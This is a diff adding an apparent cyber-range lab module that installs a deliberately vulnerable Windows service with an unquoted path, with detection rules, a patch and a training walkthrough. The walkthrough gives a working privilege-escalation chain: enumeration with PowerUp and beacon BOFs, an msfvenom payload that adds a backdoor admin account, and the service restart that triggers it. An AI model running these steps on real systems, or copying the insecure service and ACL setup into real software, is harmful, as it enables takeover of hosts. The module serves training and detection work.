@@ -1,0 +1,457 @@
+# Bolt-on: Unquoted Service Path Privilege Escalation
+# ----------------------------------------------------
+# A Windows service running as LocalSystem has an unquoted ImagePath
+# with a space in a parent directory. Windows will attempt to execute
+# each path-prefix-ending-at-space.exe in order; any user with write
+# access to one of those locations gains SYSTEM-context execution at
+# next service start.
+
+id: bolton.privilege-escalation.unquoted-service-path
+slug: unquoted-service-path
+name: "Unquoted Service Path (SYSTEM-context binplant)"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-22
+
+category: privilege-escalation
+subcategory: service-misconfig
+tags:
+  - service-account
+  - localsystem
+  - binary-planting
+  - legacy-windows-pattern
+description: >
+  Creates a Windows service "VulnerableLabSvc" with a deliberately
+  unquoted ImagePath containing spaces ("C:\Program Files\Lab Service\bin\svc.exe").
+  The C:\Program Files\Lab.exe path is left world-writable, so any local user
+  can drop a binary there. Windows Service Control Manager will execute that
+  binary as LocalSystem on next service start. Classic 90s-era pattern still
+  found in legacy enterprise installs.
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1574/009/"
+  - "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries"
+
+mitre:
+  tactic:
+    id: TA0004
+    name: "Privilege Escalation"
+  technique:
+    id: T1574
+    name: "Hijack Execution Flow"
+  subtechnique:
+    id: T1574.009
+    name: "Path Interception by Unquoted Path"
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "1781d055-5c66-4adf-9c87-bda1fa12c180"
+      rule_name: "Suspicious Service Created with Image Path in User-Writable Location"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-22
+      notes: "Catches the install side — sc create / New-Service writing to a non-system path."
+    - rule_uuid: "7405ddf1-6c8e-41ce-818f-48bea6bcaedc"
+      rule_name: "Service Binary Modified by Non-SYSTEM Account"
+      coverage: indirect
+      confidence: medium
+      last_validated: 2026-05-22
+      notes: "Catches the binplant phase — a non-SYSTEM user writing to a Program Files path."
+  signal_sources:
+    - "Windows Event 4697 — service installed"
+    - "Sysmon Event 11 — file create matching Program Files\\Lab.exe"
+    - "Sysmon Event 7 — image loaded by services.exe / spawned process tree"
+
+targets:
+  supported_os:
+    - family: windows
+      min_version: "10"
+      max_version: "2022"
+      edition_in: ["Datacenter", "Standard", "Pro", "Enterprise"]
+  required_roles:
+    - workstation
+    - member_server
+    - domain_controller
+  required_services: []
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 20
+  steps:
+    - ansible_role: bolton_unquoted_service
+      description: "Create the vulnerable service with unquoted ImagePath."
+      role_vars:
+        bolton_svc_name: "VulnerableLabSvc"
+        bolton_svc_display: "Lab Vulnerable Service"
+        bolton_svc_imagepath: "C:\\Program Files\\Lab Service\\bin\\svc.exe"
+        bolton_svc_account: "LocalSystem"
+        bolton_svc_writable_path: "C:\\Program Files"
+  verify:
+    probe: |
+      $svc = Get-CimInstance -ClassName Win32_Service -Filter "Name = 'VulnerableLabSvc'"
+      if ($svc.PathName -match '^C:\\Program Files\\' -and $svc.PathName -notmatch '^"') { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Remove the service + restore Program Files DACL."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: bolton_unquoted_service_revert
+      description: "sc delete + icacls reset."
+      role_vars:
+        bolton_svc_name: "VulnerableLabSvc"
+  verify:
+    probe: |
+      $svc = Get-CimInstance -ClassName Win32_Service -Filter "Name = 'VulnerableLabSvc'" -ErrorAction SilentlyContinue
+      if ($null -eq $svc) { exit 0 } else { exit 1 }
+    timeout_seconds: 20
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Apply standard remediation: quote the ImagePath so SCM resolves it
+    correctly + reset Program Files DACL to default (SYSTEM:F /
+    Administrators:F / Users:RX). Service is left in place so the legit
+    workload (simulated) continues running.
+  patch_reference:
+    - "https://attack.mitre.org/mitigations/M1038/"
+  complexity: low
+  side_effects:
+    - "Service ImagePath wrapped in double-quotes."
+    - "C:\\Program Files DACL reset to factory."
+  rollback_supported: true
+  steps:
+    - script: "scripts/bolton/win/quote_service_path.ps1"
+      engine: powershell
+      description: "sc config <name> binPath= \"<full-quoted-path>\""
+      args:
+        service_name: "VulnerableLabSvc"
+    - script: "scripts/bolton/win/reset_pf_acl.ps1"
+      engine: powershell
+      description: "icacls 'C:\\Program Files' /reset /T"
+      args: {}
+  verify:
+    probe: |
+      $svc = Get-CimInstance -ClassName Win32_Service -Filter "Name = 'VulnerableLabSvc'"
+      if ($svc.PathName -match '^"') { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/unquoted_path_binplant.ps1"
+
+patch_revert:
+  description: "Re-create the unquoted ImagePath + re-loosen Program Files ACL."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: bolton_unquoted_service
+      description: "Re-install vulnerable service."
+      role_vars:
+        bolton_svc_name: "VulnerableLabSvc"
+        bolton_svc_display: "Lab Vulnerable Service"
+        bolton_svc_imagepath: "C:\\Program Files\\Lab Service\\bin\\svc.exe"
+        bolton_svc_account: "LocalSystem"
+        bolton_svc_writable_path: "C:\\Program Files"
+  verify:
+    probe: |
+      $svc = Get-CimInstance -ClassName Win32_Service -Filter "Name = 'VulnerableLabSvc'"
+      if ($svc.PathName -notmatch '^"') { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Vulnerable service is back. Drop C:\\Program Files\\Lab.exe to test."
+
+cost:
+  storage_mb: 0
+  cpu_pct: 0
+  detectability: medium
+
+curriculum:
+  title: "Unquoted Service Path — Plant a binary, get SYSTEM at next service start"
+  summary: >
+    Guided walkthrough of the classic Windows local-priv pattern against
+    tlws01. You will enumerate services with PowerUp, accesschk, and a
+    CS BOF; identify the deliberately-vulnerable VulnerableLabSvc with
+    its unquoted ImagePath and world-writable parent; plant a payload
+    at C:\Program Files\Lab.exe; and trigger SYSTEM execution by
+    restarting the service.
+  learning_objectives:
+    - "Explain Windows Service Control Manager's path-resolution behaviour for unquoted ImagePath strings with spaces."
+    - "Enumerate vulnerable services using three independent toolchains (PowerUp, Sysinternals accesschk, CS BOF)."
+    - "Distinguish exploitability gates: (a) unquoted ImagePath, (b) space in a parent directory, (c) write access to an intermediate path, (d) ability to trigger service restart."
+    - "Map the install and exploitation phases to firing Elastic rules."
+  prerequisites:
+    - "Beacon on tlws01 as local user tlws01\\localuser (P@ssw0rd1!) or TESTLAB\\jdoe"
+    - "The unquoted-service-path bolt-on installed (creates VulnerableLabSvc)"
+    - "PowerUp.ps1 (PowerShellMafia/PowerSploit) or accesschk.exe (Sysinternals) staged on tlws01"
+  estimated_total_minutes: 30
+  steps:
+    - id: "01-windows-path-resolution"
+      title: "Understand SCM's path resolution"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Why an unquoted ImagePath is dangerous
+
+        When the Windows Service Control Manager parses an unquoted
+        `ImagePath` value containing spaces, it tries each
+        path-prefix-ending-at-space as a candidate executable in order.
+        For an ImagePath of:
+
+        ```
+        C:\Program Files\Lab Service\bin\svc.exe
+        ```
+
+        SCM will try, in this exact order:
+
+        1. `C:\Program.exe`
+        2. `C:\Program Files\Lab.exe`
+        3. `C:\Program Files\Lab Service\bin\svc.exe`
+
+        If a non-admin user can drop an executable at `C:\Program.exe` or
+        `C:\Program Files\Lab.exe`, SCM picks it up and runs it as the
+        service account (LocalSystem here) at the next service start.
+
+        The fix is trivial — wrap the ImagePath in double quotes — but
+        plenty of legacy installers (1990s Win32 vendor MSIs especially)
+        ship binPath= values without quotes.
+    - id: "02-enumerate-with-powerup"
+      title: "Enumerate vulnerable services with PowerUp"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 2 — PowerUp's Get-UnquotedService check
+
+        On the tlws01 beacon as `tlws01\localuser`:
+
+        ```powershell
+        # PowerUp ships with PowerSploit
+        Import-Module .\PowerUp.ps1
+        Get-UnquotedService
+        ```
+
+        Expected output:
+
+        ```
+        ServiceName    : VulnerableLabSvc
+        Path           : C:\Program Files\Lab Service\bin\svc.exe
+        StartName      : LocalSystem
+        AbuseFunction  : Write-ServiceBinary -ServiceName 'VulnerableLabSvc' -Path <HijackPath>
+        CanRestart     : False
+        ```
+
+        Or run the full audit:
+
+        ```powershell
+        Invoke-AllChecks
+        # Yields all PowerUp findings: unquoted paths, weak service ACLs,
+        # always-install-elevated, AlwaysInstallElevated MSI, hijackable
+        # %PATH% directories, registry autoruns, etc.
+        ```
+
+        > **Detection callout** — *PowerUp / PowerSploit Function Loaded*
+        > (looks for `Get-UnquotedService`, `Invoke-AllChecks` strings via
+        > ScriptBlock Logging EID 4104). PowerUp's script-block signatures
+        > are well-known to AMSI.
+      assessment:
+        question: "What does PowerUp's `CanRestart : False` mean for the operator?"
+        options:
+          - "The service can't be exploited at all."
+          - "The current user lacks SERVICE_START / SERVICE_STOP rights on the service, so triggering SYSTEM execution requires either waiting for a reboot, finding another start trigger (logon, network event), or chaining with a service-permissions vulnerability."
+          - "The service is already running and can never be restarted."
+          - "Restart requires the patch to be applied first."
+        correct_index: 1
+        explanation: >
+          PowerUp reports CanRestart based on whether the calling user has
+          SERVICE_START or SERVICE_STOP rights. False means you can plant
+          the payload, but you can't easily trigger pickup — you wait for
+          the next reboot or look for another trigger. Pair with a
+          service-ACL bolt-on (if present) to make the chain one-shot.
+    - id: "03-enumerate-with-accesschk"
+      title: "Cross-check with Sysinternals accesschk"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 3 — accesschk as a second source
+
+        PowerUp is heuristic and AMSI-flagged; accesschk is signed by
+        Microsoft and rarely alerted on. Both should agree on the
+        misconfig.
+
+        Download from
+        https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
+        (or stage from your tools share):
+
+        ```cmd
+        :: Check write access on the intermediate directories
+        accesschk.exe -accepteula -wuvs "Everyone" "C:\Program Files"
+        accesschk.exe -accepteula -wuvs "Authenticated Users" "C:\Program Files"
+        ```
+
+        Expected output:
+
+        ```
+        RW C:\Program Files
+          DESCRIPTOR FLAGS:
+                [SE_DACL_PRESENT]
+                [SE_SACL_PRESENT]
+                [SE_DACL_AUTO_INHERITED]
+                [SE_SACL_AUTO_INHERITED]
+          OWNER: BUILTIN\Administrators
+          [WRITE_OWNER] [WRITE_DAC] [FILE_GENERIC_WRITE] [FILE_GENERIC_EXECUTE] [FILE_GENERIC_READ]
+        ```
+
+        `RW` on `C:\Program Files` for Everyone or Authenticated Users is
+        the killer — combined with the unquoted ImagePath, you have a
+        binary-plant vector.
+
+        ```cmd
+        :: Inspect the service itself
+        sc qc VulnerableLabSvc
+        ```
+
+        ```
+        BINARY_PATH_NAME   : C:\Program Files\Lab Service\bin\svc.exe
+        SERVICE_START_NAME : LocalSystem
+        ```
+
+        Note the unquoted BINARY_PATH_NAME (no surrounding `"`).
+    - id: "04-cs-bof-enum"
+      title: "CS BOF: in-memory service enumeration"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 4 — BOF-based enum (in-memory, AMSI-safe)
+
+        If you want to stay off disk and out of PowerShell, use a service-
+        enumeration BOF. A common choice is `services-info.x64.o` from
+        `trustedsec/CS-Situational-Awareness-BOF`:
+
+        ```
+        beacon> inline-execute /opt/bofs/services-info.x64.o
+        ```
+
+        Or specifically for unquoted paths,
+        `outflanknl/EvilClippy`-adjacent `unquoted-services.x64.o`:
+
+        ```
+        beacon> inline-execute /opt/bofs/unquoted-services.x64.o
+        [+] VulnerableLabSvc : C:\Program Files\Lab Service\bin\svc.exe (LocalSystem)
+        [+]   Writable parent: C:\Program Files (Everyone:RW)
+        ```
+
+        BOFs run inside beacon.exe — no powershell.exe, no new process,
+        no script-block log entry.
+
+        > **Detection callout** — BOFs avoid Sysmon EID 1 process-creation
+        > entirely. Detection moves to API-call monitoring (EID 10 with
+        > EnumServicesStatusEx + QueryServiceConfig as the indicators).
+    - id: "05-plant-and-trigger"
+      title: "Plant the payload and trigger SYSTEM execution"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 5 — Drop the payload + restart the service
+
+        Generate a payload that adds a backdoor admin user (or a CS
+        stager). msfvenom from Kali:
+
+        ```bash
+        msfvenom -p windows/x64/exec \
+            CMD='net user pwn3d Password1! /add && net localgroup administrators pwn3d /add' \
+            -f exe -o /tmp/Lab.exe
+        ```
+
+        Transfer to tlws01 and drop at the hijack path:
+
+        ```
+        beacon> upload /tmp/Lab.exe
+        beacon> shell move beacon-out\Lab.exe "C:\Program Files\Lab.exe"
+        ```
+
+        Trigger the service. If you have SERVICE_START rights:
+
+        ```powershell
+        Restart-Service VulnerableLabSvc
+        # Or via sc.exe:
+        sc.exe stop VulnerableLabSvc
+        sc.exe start VulnerableLabSvc
+        ```
+
+        SCM walks the candidate-path list, hits `C:\Program Files\Lab.exe`
+        (your binary), and launches it as LocalSystem. Verify:
+
+        ```cmd
+        net user pwn3d
+        :: Local Group Memberships  *Administrators
+        ```
+
+        If you don't have restart rights, wait for the next reboot or
+        force one via a separate primitive.
+
+        > **Detection callout** — *Service Binary Modified by Non-SYSTEM
+        > Account* (`7405ddf1-6c8e-41ce-818f-48bea6bcaedc`) fires on the
+        > Sysmon EID 11 file-create at `C:\Program Files\Lab.exe` by a
+        > non-SYSTEM identity. The combination of (a) file create in
+        > Program Files by a non-admin and (b) immediate service stop/start
+        > is the highest-fidelity signal.
+      assessment:
+        question: "You drop Lab.exe successfully but Restart-Service fails with Access Denied. What's the most likely next move?"
+        options:
+          - "Give up — the exploit can't work."
+          - "Re-run PowerUp's Get-ModifiableService to look for service-ACL misconfigurations that grant SERVICE_START to your user; if none, wait for next reboot or chain with a separate reboot primitive."
+          - "Reinstall the bolt-on."
+          - "Replace the binary at C:\\Program.exe instead."
+        correct_index: 1
+        explanation: >
+          The plant phase succeeded; only the trigger is gated. Standard
+          chain options: (1) find a service ACL granting your user
+          SERVICE_START on this or any other service that depends on it,
+          (2) wait for reboot (the binary persists and SCM picks it up at
+          boot), (3) trigger an automatic restart by killing a dependent
+          process. Replacing C:\\Program.exe is also valid (it's tried
+          first in the resolution order) if C:\\ is writable.
+    - id: "06-detect-and-patch"
+      title: "Blue-team detection + mitigation"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 6 — Detect, then patch
+
+        In Kibana (https://10.99.50.13:5601), filter on host.name : tlws01
+        for the past 30 minutes. Expected hits:
+
+        | Rule | Event | What it shows |
+        |---|---|---|
+        | Suspicious Service Created with Image Path in User-Writable Location | EID 4697 / Sysmon 1 | sc.exe / New-Service writing ImagePath outside System32 |
+        | Service Binary Modified by Non-SYSTEM Account | Sysmon EID 11 | File create at C:\Program Files\Lab.exe by tlws01\localuser |
+        | Suspicious PowerShell ScriptBlock — PowerUp | EID 4104 | Get-UnquotedService strings |
+
+        **Mitigation** — click **Patch**. The patch action:
+
+        1. Wraps the ImagePath in double quotes:
+           `sc config VulnerableLabSvc binPath= "\"C:\Program Files\Lab Service\bin\svc.exe\""`
+        2. Resets `C:\Program Files` DACL to defaults
+           (`icacls "C:\Program Files" /reset /T`)
+
+        Verify:
+
+        ```powershell
+        (Get-CimInstance Win32_Service -Filter "Name='VulnerableLabSvc'").PathName
+        # "C:\Program Files\Lab Service\bin\svc.exe"   <-- now quoted
+        ```
+
+        Re-run Step 5. SCM resolves the path correctly, ignores
+        `C:\Program Files\Lab.exe`, and starts the legitimate stub. The
+        planted binary is now dead weight.
+
+        ### Defensive guidance for the org
+
+        - Audit every service: `Get-WmiObject Win32_Service | Where-Object
+          { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } |
+          Select Name, PathName`
+        - Reset Program Files DACL via GPO at scale
+        - Block non-admin write under `C:\` root, `C:\Program Files`,
+          `C:\Program Files (x86)` via NTFS audit policy
+
+status: stable
